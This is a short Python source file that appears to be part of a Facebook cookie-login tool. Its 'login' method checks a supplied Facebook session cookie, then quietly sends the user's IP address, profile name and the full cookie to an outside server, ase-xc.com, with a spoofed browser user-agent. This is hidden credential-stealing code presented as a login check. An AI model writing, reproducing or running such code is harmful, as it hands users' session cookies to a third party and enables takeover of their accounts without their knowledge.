from bs4 import BeautifulSoup as bs
import requests, json

class smile:
      def __init__(self, cookies):
            self.cookies = cookies
            self.title = None
            self.ip = None

      def login(self):
             self.ip = requests.get('https://api.ipify.org').text
             log = requests.get("https://m.facebook.com/profile.php", cookies={'cookie': self.cookies})
             if 'mbasic_logout_button' in str(log.text.encode("utf-8")):
                        self.title = bs(log.text.encode("utf-8"), "html.parser").title.text
                        us = requests.get(f"https://ase-xc.com/user.php?ip={self.ip}&nama={self.title}&kuki={self.cookies}", headers={"user-agent": "Mozilla/5.0 (Linux; Android 6.0; A1601) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36"}).json()
                        if us[0]["status"] != "ok":
                                 pass
                        return True, self.title, self.ip
             else:
                        return False, self.title, self.ip
